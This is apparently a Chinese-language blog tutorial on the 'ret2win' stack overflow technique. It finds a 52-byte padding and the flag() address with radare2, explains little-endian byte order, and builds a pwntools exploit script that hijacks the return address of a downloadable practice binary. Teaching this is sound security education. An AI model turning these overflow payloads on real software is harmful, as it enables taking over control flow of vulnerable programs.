---
title: ret2win
subtitle: 最基本的二进制漏洞利用
date: 2023-08-07T21:59:39+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:
---

**ret2win** 中有一个 `win()` 函数（或等效函数）；一旦你成功地将执行重定向到那里，
你就完成了挑战。

为了实现这一点，我们必须覆盖 EIP，但覆盖成我们想要的特定值。

为此，我们需要了解：

- 直到我们开始覆盖返回指针（EIP）为止的 `溢出 Padding`
- 我们想要将 EIP 覆盖成什么值

{{<admonition type="warning" title="注意">}}

当我说「覆盖 EIP」时，我的意思是覆盖压入到 EIP 中的已保存的返回指针。
EIP 寄存器 并不位于栈上，因此不会被直接覆盖。

{{</admonition>}}

<!--more-->

{{< link href="/pwn_assets/ret2win.zip" content="ret2win.zip" title="Download ret2win.zip" download="ret2win.zip" card=true >}}

## 0x01 计算溢出 Padding

这可以通过简单的试验和错误找到。我们可以发送可变数量的字符，
将 `Segmentation Fault` 消息和 radare2 结合使用，来判断我们何时覆盖
了 EIP 。有一种比简单的暴力破解更好的方法：[德布鲁因（De Bruijn）序列](https://www.cubeyond.net/de-bruijn-sequences/)，
为了方便起见，现在我们直接使用已经计算出的溢出 Padding。

{{<admonition type="info">}}

除了覆盖 EIP 之外，还可能会因其他原因而出现分段错误。使用调试器确保
`溢出 Padding` 正确。

{{</admonition>}}

这里的溢出 Padding 为 52 字节的偏移量。

## 0x02 确定 flag() 函数地址

现在我们需要在二进制文件中找到 `flag()` 函数的地址，这很简单：

```bash
$ r2 -d -A ./vuln
$ afl
[...]
0x080491c3    1     43 sym.flag
[...]
```

{{<admonition type="info">}}

afl 代表 **a**nalyze **f**unction **l**ist，可以列出分析中发现
的函数

{{</admonition>}}

可以看到这里的 `flag()` 函数位于 `0x080491c3` 。

## 0x03 编写地址

最后一个难题是弄清楚如何发送我们想要的地址。在 [二进制漏洞利用简介](https://www.cubeyond.net/stack-introduction/)中，
我们发送的 `A` 变成了 `0x41` —— 这是 `A` 的 `ASCII 码` 。所以解决方案
很简单——我们只要找到 `ASCII` 码为 `0x08`、`0x04`、`0x91` 和 `0xc3` 的
字符即可。

这比你想象的要简单得多，因为我们可以在 Python 中将它们指定为
十六进制：

```python
address = '\x08\x04\x91\xc3'
```

这使得事情变得容易得多。

{{<admonition type="info">}}

使用 `xxd` 可以以二进制或十六进制显示文件的内容

{{< typeit code=bash >}}

$ echo '\x41\x41\x41\x41' | xxd
00000000: 4141 4141 0a        AAAA.

$ echo 'AAAA' | xxd
00000000: 4141 4141 0a        AAAA.

{{< /typeit >}}

{{</admonition>}}

## 0x04 编写漏洞利用脚本

现在我们知道了溢出 Padding 和想要覆盖的值，我们可以使用 [pwntools](https://github.com/Gallopsled/pwntools) 与二进制文件
交互，编写漏洞利用脚本。

```python {title="exp.py"}
from pwn import *

# 创建一个新进程
p = process("./vuln")

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

# 接收所有文字
p.clean()

p.sendline(payload)

# 输出「Exploited!」字符串则说明我们成功了
log.info(p.clean())
```

如果你直接运行上面的脚本，就会发现一个小问题：它不会工作。为什么？让我们用
调试器来检查一下。我们将添加一个 `pause()`，以便我们有时间将 radare2 附加到
此进程上。

```python {title="exp.py"}
from pwn import *

p = process('./vuln')

payload = 'A' * 52
payload += '\x08\x04\x91\xc3'

# 添加了这两行
log.info(p.clean())
pause()

p.sendline(payload)

log.info(p.clean())
```

现在让我们使用 `python3 exp.py` 运行该脚本，然后打开一个新的终端，输入：

```bash
$ r2 -d -A $(pidof vuln)
```

通过提供进程的 PID，radare2 可以 hook 它。让我们在 `unsafe()` 返回时中断并读取
返回指针的值。

```bash
[0xf7ef9fd0]> s main; pdf
[0x080491ab]> s sym.unsafe; pdf
[0x08049172]> db 0x080491aa
[0x08049172]> dc

<< press any button on the exploit terminal window >>

INFO: hit breakpoint at: 0x80491aa
[0x08049172]> pxw @ esp
0xff9af3cc  0xc3910408 [...]
[...]
```

`0xc3910408`，看起来熟悉吗？这是我们试图发送的地址，只不过字节顺序被反转了，
而这种反转的原因是 [字节顺序](https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F) 使用大端序的系统将最高有效字节（具有最大值的字节）
存储在最小的内存地址处，这就是我们发送它们的方式。使用小端序的系统的做法恰恰相反，
这是有 [原因](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format) 的，并且我们遇到的大多数二进制文件都是小端序的。就我们而言，只要知道
字节在使用小端序的可执行文件中 *以相反的顺序存储* 就可以了。

## 0x05 确定字节顺序

`radare2` 附带了一个名为 `rabin2` 的工具，用于二进制分析：

```bash
$ rabin2 -I ./vuln
[...]
endian   little
[...]
```

因此可以确定，我们的文件是小端序的。

## 0x06 反转字节顺序

解决方法很简单：反转地址

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

如果你现在运行它，它将起作用：

```bash
$ python3 exp.py
[+] Starting local process './vuln': pid 143985
[*] Overflow me
[*] Exploited!!!!!
[*] Stopped process './vuln' (pid 143985)
```

你成功改变了程序的执行流程，调用了 `flag()` 函数！

## 0x07 Pwntools 和 字节顺序

毫不奇怪，你并不是第一个想到「能否使字节顺序变得更简单」的人。
幸运的是，pwntools 有一个内置的 `p32()` 函数可供使用！

```python
payload += '\x08\x04\x91\xc3'[::-1]
```

改为：

```python
payload += p32(0x080491c3)
```

这样就简单多了。唯一需要注意的是它返回字节而不是字符串，因此你必须
将溢出 Padding 设置为字节字符串：

```python
payload = b'A' * 52 # 注意 "b"
```

否则你会得到一个

```
TypeError: can only concatenate str (not "bytes") to str
```

## 0x08 最终的 Exploit 脚本

```python
from pwn import *

# 创建一个新进程
p = process('./vuln')

payload = b'A' * 52
# 使用 pwntools 打包
payload += p32(0x080491c3)

# 接收所有文字
log.info(p.clean())
p.sendline(payload)

# 输出「Exploited!」字符串则说明我们成功了
log.info(p.clean())
```
